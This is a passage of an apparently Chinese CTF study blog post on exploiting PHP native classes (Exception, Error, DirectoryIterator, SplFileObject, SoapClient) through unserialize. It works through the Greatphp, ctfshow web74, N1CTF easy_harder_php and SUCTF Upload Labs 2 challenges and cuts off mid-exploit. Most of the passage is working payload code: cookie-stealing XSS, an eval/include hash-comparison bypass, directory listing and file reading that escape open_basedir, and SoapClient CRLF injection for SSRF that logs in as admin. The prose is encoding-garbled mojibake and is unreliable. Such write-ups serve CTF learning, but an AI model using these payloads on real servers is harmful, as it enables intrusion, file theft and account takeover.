unserialize($a);</code></pre><p> ç»™äº†GETä¼ å‚ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œä¸çŸ¥é“æ€ä¹ˆè‡ªå®šä¹‰ç±»ï¼Œé‡åˆ°äº†ååºåˆ—åŒ–æ²¡æœ‰POPé“¾çš„æƒ…å†µã€‚åªèƒ½é€šè¿‡phpå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–ï¼Œåˆå­˜åœ¨echoï¼Œå¯ä»¥ç”¨__toStringæ–¹æ³•è¿”å›å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ã€‚è¯¥é¢˜ä¸ºXSSä¹‹å…‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡XSSæ‹¿å‡ºFLAGã€‚<br> æ€è·¯ï¼šflagä¸€èˆ¬åœ¨COOKIEçš„ä¿¡æ¯é‡Œã€‚<br>poc:</p><pre><code class="php">&lt;?php$poc=new    Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);Echo urlencode(serialize($poc));?&gt;åå¼¹cookie</code></pre><p> å°†å¾—åˆ°çš„ç»“æœä¼ å…¥<br>/?yds_is_so_beautiful=$POC  </p><h1 id="åˆ©ç”¨Error-Exception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a href="#åˆ©ç”¨Error-Exception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="åˆ©ç”¨Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a>åˆ©ç”¨Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h1><p> æµ‹è¯•ä»£ç   :</p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;</code></pre><p> å‘ç°ä¼šä»¥å­—ç¬¦ä¸²è¿›è¡Œè¾“å‡ºï¼ŒåŒ…æ‹¬å½“å‰çš„é”™è¯¯ä¿¡æ¯payloadä»¥åŠæŠ¥é”™çš„è¡Œå·2ï¼Œä¼ å…¥ Error(â€œpayloadâ€,1) ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ã€‚  </p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\r\n\r\n&quot;;echo $b;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898879803-a51766b8-316d-464b-83a4-2f80e33e69a3.png" alt="image.png"><br> $a å’Œ $b è¿™ä¸¤ä¸ªé”™è¯¯å¯¹è±¡æœ¬èº«æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯ __toString æ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚<br>å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æœç„¶å“ˆå¸Œæ¯”è¾ƒã€‚  </p><h2 id="2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp"><a href="#2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp" class="headerlink" title="[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp"></a><strong>[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp</strong></h2><p> è€ƒç‚¹ï¼šphpå†…ç½®ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒã€phpå–åç»•è¿‡  </p><pre><code class="php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p> è¦æ˜¯å¸¸è§çš„phpé¢˜ç›®ï¼Œå¯ä»¥æ•°ç»„ç»•è¿‡å¼ºç±»å‹ã€‚åœ¨è¿™é¢˜ç›®ä¸­ï¼Œéœ€è¦Errorç±»ã€‚<br>ä¸»è¦æ˜¯ç»•è¿‡è¿™ä¸ª</p><pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code></pre><p> md5()å’Œsha1()å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashï¼Œå¹¶ä¸”ä¼šè§¦å‘è¿™ä¸ªç±»çš„ __toString æ–¹æ³•ï¼›ä¸”å½“eval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè§¦å‘è¿™ä¸ªç±»é‡Œçš„ __toString æ–¹æ³•ã€‚<br>æˆ‘ä»¬å…ˆæ¥æµ‹è¯•ä¸€ä¸‹:<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="img"><br>æ³¨æ„ä¸¤ä¸ªErrorè¦åœ¨åŒä¸€è¡Œå“¦ï¼Œå¦åˆ™ä»–ä»¬æŠ¥é”™çš„è¾“å‡ºæœ‰è¡Œæ•°çš„ä¸åŒï¼<br>payload:</p><pre><code class="php">&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;&#125;//$cmd = &quot;flag.php&quot;;//$str = urlencode(~$cmd);  %99%93%9E%98%D1%8F%97%8F$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;//print $str;echo &quot;\r\n\r\n&quot;;$c = new SYCLOVER();$c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);echo urlencode(serialize($c));?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="img"><br>è¿™é‡Œå…¶å®æœ‰ä¸€ä¸ªåœ°æ–¹è¦æ³¨æ„:</p><pre><code class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;</code></pre><p>ä¸ºä»€ä¹ˆæœ€å‰é¢è¦åŠ ä¸Š?&gt;å‘¢<br>æˆ‘ä»¬è¿˜è®°å¾—Errorç±»è¿”å›ä»€ä¹ˆå—?<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="img"><br>Erroræ˜¯æ— æ³•ç›´æ¥è¿”å›æˆ‘ä»¬æ‰€éœ€è¦çš„paylaodçš„ï¼Œå®ƒå‰é¢æœ‰Error:å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&gt;?å»é—­åˆå®ƒ<br>æœ€ç»ˆæˆ‘ä»¬çš„è¯­å¥å°±å˜ä¸º:</p><pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)</code></pre><p>è¿™æ ·å®é™…ä¸Šæ˜¯ä¸å½±å“è¯­å¥çš„æ‰§è¡Œ</p><h1 id="å¯éå†ç›®å½•ç±»"><a href="#å¯éå†ç›®å½•ç±»" class="headerlink" title="å¯éå†ç›®å½•ç±»"></a>å¯éå†ç›®å½•ç±»</h1><h2 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h2><pre><code class="php">ç‰ˆæœ¬ï¼šphp5ã€php7ã€php8Filesystemlteratorç‰ˆæœ¬ï¼šPHP 5 &gt;= 5.3.0, PHP 7, PHP 8</code></pre><pre><code class="php">&lt;?php highlight_file(__file__); $dir=$_GET[&#39;cmd&#39;]; $a=new DirectoryIterator($dir); foreach($a as $f)&#123;     echo($f -&gt; __toString().&quot;&lt;br&gt;&quot;);      &#125; ?&gt; </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="img"><br> æŸ¥çœ‹è¯¥ç±»ï¼Œå‘ç°__toString()æ–¹æ³•<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="img"><br> ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚å½“æ‰§è¡Œåˆ°echoå‡½æ•°æ—¶ï¼Œä¼šè§¦å‘DirectoryIteratorç±»ä¸­çš„toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å é…åˆglob://åè®®ä½¿ç”¨æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶è·¯å¾„ </p><h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚<br>è¯¥ç±»çš„ä½¿ç”¨æ–¹æ³•ä¸DirectoryIterator ç±»ä¹Ÿæ˜¯åŸºæœ¬ç›¸åŒçš„ï¼š(å­ç±»ä¸çˆ¶ç±»çš„å…³ç³»)</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="img"><br>éå†ä¸€ä¸‹</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;foreach($dir as $tmp)&#123;    echo($tmp.&#39;&lt;br&gt;&#39;);    echo &quot;\n&quot;;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="img"></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject ç±»å’Œ SplFileinfoä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="img"></p><pre><code class="php">    &lt;?php    $dir=new SplFileObject(&quot;flag.php&quot;);    echo $dir;    ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="img"><br> å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š  </p><pre><code class="php">&lt;?php$dir = new SplFileObject(&quot;flag.php&quot;);foreach($dir as $tmp)&#123;    echo ($tmp.&#39;&lt;br&gt;&#39;);&#125;?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="img"><br>å‡ºé¢˜çš„æ—¶å€™å¦‚æœçœ‹åˆ°å½¢å¦‚:</p><pre><code class="php">    echo new $this-&gt;key($this-&gt;value);      $this -&gt; a = new $this-&gt;key($this-&gt;value);    echo $this-&gt;a;</code></pre><p> åªéœ€è¦è®©**$this-&gt;key<strong>å€¼èµ‹ä¸ºæˆ‘ä»¬æƒ³ç”¨åŸç”Ÿå‡½æ•°ï¼Œ</strong>$this-&gt;value**èµ‹ä¸ºè·¯å¾„ï¼ŒæŸ¥å°±è¡Œäº†ã€‚ä½†æ˜¯è¿™ç§æ„é€ ç±»å‹çš„æ–¹æ³•çš„å±€é™æ€§å°±æ˜¯åªèƒ½æŸ¥ä¸€ä¸ªè·¯å¾„ä¸Šçš„ä¸€ä¸ªæ–‡ä»¶ã€‚  </p><pre><code class="php">&lt;?phpclass HY&#123;    public $a;    public $b;&#125;$c = new HY();$c-&gt;a=&quot;SplFileObject&quot;;$c-&gt;b=&quot;flag.php&quot;;echo new $c-&gt;a($c-&gt;b);?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="img"></p><h1 id="çªç ´open-basedirçš„é™åˆ¶"><a href="#çªç ´open-basedirçš„é™åˆ¶" class="headerlink" title="çªç ´open_basedirçš„é™åˆ¶"></a>çªç ´open_basedirçš„é™åˆ¶</h1><p> ctfshow web74  </p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0); // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#39;c&#39;]))&#123;    $c=$_POST[&#39;c&#39;];    eval($c);    $s=ob_get_contents();    ob_end_clean();    echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__); &#125; ?&gt;?&gt;</code></pre><p>é¦–å…ˆä»‹ç»ä¸€ä¸‹ob_get_contents()å’Œob_end_cleanè¿™ä¸¤ä¸ªå‡½æ•°ã€‚<br>ç¼“å†²åŒº(Buffer)å°±æ˜¯åœ¨å†…å­˜ä¸­é¢„ç•™æŒ‡å®šå¤§å°çš„å­˜å‚¨ç©ºé—´ç”¨æ¥å¯¹I/Oçš„æ•°æ®åšä¸´æ—¶å­˜å‚¨ï¼Œè¿™éƒ¨åˆ†é¢„ç•™çš„å†…å­˜ç©ºé—´å«ç¼“å†²åŒºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å†…å­˜ç©ºé—´ä¸­é¢„ç•™äº†ä¸€å®šçš„å­˜å‚¨ç©ºé—´ï¼Œè¿™äº›å­˜å‚¨ç©ºé—´ç”¨æ¥ç¼“å†²è¾“å…¥æˆ–è¾“å‡ºçš„æ•°æ®ï¼Œè¿™éƒ¨åˆ†é¢„ç•™çš„ç©ºé—´å°±å«åšç¼“å†²åŒºã€‚<br>ç¼“å†²åŒºæ ¹æ®å…¶å¯¹åº”çš„æ˜¯è¾“å…¥è®¾å¤‡è¿˜æ˜¯è¾“å‡ºè®¾å¤‡ï¼Œåˆ†ä¸ºè¾“å…¥ç¼“å†²åŒºå’Œè¾“å‡ºç¼“å†²åŒºã€‚<br>ob_get_contents:è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ï¼Œåªæ˜¯å¾—åˆ°ç¼“å†²åŒºçš„å†…å®¹ï¼Œä½†ä¸æ¸…é™¤å®ƒã€‚<br>ob_end_clean:æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²ã€‚<br>evalæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤åï¼Œè¾“å‡ºflagå†…å®¹ï¼Œä½†æ˜¯è¾“å‡ºè¦ç»è¿‡ç¼“å†²åŒºï¼Œå¯¹è¾“å‡ºæ•°æ®è¿›è¡Œç¼“å­˜ï¼Œé€šè¿‡ob_get_contents() åŸæ¥çš„æ•°æ®èµ‹å€¼ç»™äº†$sï¼Œç„¶ååˆç”¨ob_end_cleanå°†ç¼“å†²åŒºæ¸…ç©ºäº†ï¼Œé‚£ä¹ˆevalå°±æ²¡åŠæ³•è¾“å‡ºäº†ï¼ˆç¼“å†²åŒºéƒ½è¢«æ¸…ç©ºäº†ï¼‰ï¼Œæ‰€ä»¥å°±åªæœ‰$sä¸€ä¸ªè¾“å‡ºäº†ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡exit()æˆ–è€…die() ï¼ˆexitåˆ«åï¼‰é€€å‡ºï¼Œè¿™æ ·çš„è¯å°±æ²¡æœ‰ob_end_cleanè¿™ä¸ªç¼“å†²åŒºæ¸…ç©ºæ“ä½œï¼Œè¾“å‡ºå°±èƒ½æ­£å¸¸è¾“å‡ºã€‚<br><strong>æ„é€ payload:</strong></p><pre><code class="php">c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);?&gt;</code></pre><p>ç„¶åè¯»å–æ–‡ä»¶</p><pre><code class="php">&gt;c=include(&#39;/flagx.txt&#39;);exit();</code></pre><h1 id="åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF-SSRF"><a href="#åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF-SSRF" class="headerlink" title="åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF+SSRF"></a>åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF+SSRF</h1><p> soapClientï¼šä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚<br>ç±»ä»‹ç»ï¼š  </p><pre><code class="php">SoapClient &#123;    /* æ–¹æ³• */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;</code></pre><p> å­˜åœ¨_ _callæ–¹æ³•ï¼Œå½“__callæ–¹æ³•è¢«è§¦å‘ï¼Œå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ã€‚ä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚è€Œ__callè§¦å‘å¾ˆç®€å•ï¼Œå°±æ˜¯å½“å¯¹è±¡è®¿é—®ä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™å°±ä¼šè§¦å‘ã€‚  </p><pre><code class="php">å‡½æ•°å½¢å¼ï¼š    public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡æ˜æ˜¯å¦ä¸ºwsdlæ¨¡å¼ï¼Œä¸ºnullåˆ™ä¸ºéwsdlæ¨¡å¼wsdlï¼Œå°±æ˜¯ä¸€ä¸ªxmlæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºæè¿°Web Serverçš„å®šä¹‰ç¬¬äºŒä¸ªå‚æ•°ä¸ºarrayï¼Œwsdlæ¨¡å¼ä¸‹å¯é€‰ï¼›éwsdlæ¨¡å¼ä¸‹ï¼Œéœ€è¦è®¾ç½®locationå’Œuriï¼Œlocationå°±æ˜¯å‘é€SOAPæœåŠ¡å™¨çš„URLï¼Œuriæ˜¯æœåŠ¡çš„å‘½åç©ºé—´</code></pre><p> é¦–å…ˆæµ‹è¯•ä¸‹æ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³•  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼ŒSOAPActionå¤„å¯æ§ï¼Œå¯ä»¥æŠŠ\x0d\x0aæ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯ wsdl æ¨¡å¼ã€‚<br>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨ wsdl æ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨é wsdl æ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½® location å’Œ uri é€‰é¡¹ï¼Œå…¶ä¸­ location æ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„ SOAP æœåŠ¡å™¨çš„ URLï¼Œè€Œ uri æ˜¯ SOAP æœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚å…·ä½“å¯ä»¥è®¾ç½®çš„å‚æ•°å¯è§å®˜æ–¹æ–‡æ¡£<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p><p>ä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typ,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ®<br>åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢</p><pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :The user_agent option specifies string to use in User-Agent header.</code></pre><p>user_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLFï¼Œæ§åˆ¶Content-Typeçš„å€¼</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=my_session&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299243252-81156156-b050-4637-bea8-54bd0d302863-166888019827967.png" alt="img"></p><p>å¦‚ä¸Šï¼Œä½¿ç”¨SoapClient<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">ååºåˆ—åŒ–</a>+CRLF<strong>å¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚</strong>ã€‚<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p><h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(æˆ‘è¿™é‡Œæƒ³å¤ç°ä¸€ä¸‹ï¼Œæ„Ÿè§‰codeé‚£é‡Œæœ‰é—®é¢˜ï¼Œæ— æ³•è¿›è¡Œæ³¨å†Œå’Œç™»å½•æ“ä½œ)<br>æ‹¿åˆ°adminå¯†ç ä¹‹åï¼Œéœ€è¦ä»127.0.0.1ç™»é™†ï¼Œç”¨åˆ°SSRFï¼Œé€šè¿‡æ³¨å…¥a`, {serialize object});#å¼•å‘ååºåˆ—åŒ–æ¼æ´<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="img"><br>ååºåˆ—åŒ–åçš„SoapClientå¯¹è±¡å»è°ƒç”¨ä¸å­˜åœ¨çš„getcountryæ–¹æ³•ï¼Œè°ƒç”¨__callï¼Œå®ç°SSRF<br>æ§åˆ¶PHPSESSIDä¸ºè‡ªå·±çš„sessionï¼ŒSSRFæ¥è¿›è¡Œadminç™»é™†</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1/index.php?action=login&#39;;$post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo bin2hex($aaa);?&gt;</code></pre><p> å†ä½¿ç”¨ä¸Šé¢çš„PHPSESSIDè®¿é—®ï¼Œå°±æ˜¯adminäº†  </p><h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png" alt="img"><br>è¿™é‡Œåªå…è®¸æœ¬åœ°è®¿é—®ï¼Œæˆ‘ä»¬è¦è¿›è¡Œssrf<br>æ„é€ exp:</p><pre><code class="php">&lt;?phpclass File&#123;    public $file_name;    public $func = &quot;SoapClient&quot;;    function __construct($file_name)&#123;        $this-&gt;file_name = $file_name;    